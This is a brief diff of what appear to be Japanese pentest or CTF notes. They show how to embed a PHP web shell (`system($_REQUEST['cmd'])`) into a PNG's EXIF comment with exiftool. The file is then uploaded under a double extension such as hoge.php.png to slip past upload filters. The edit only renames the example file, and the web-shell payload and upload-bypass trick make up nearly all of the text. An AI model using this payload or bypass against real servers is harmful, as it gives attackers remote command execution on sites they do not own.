@@ -4,7 +4,7 @@
 exifに埋め込む
 
 ```
-$ exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.png
+$ exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' hoge.png
 ```
 
-これでtest.php.pngとしてupload
+これでhoge.php.pngとしてupload
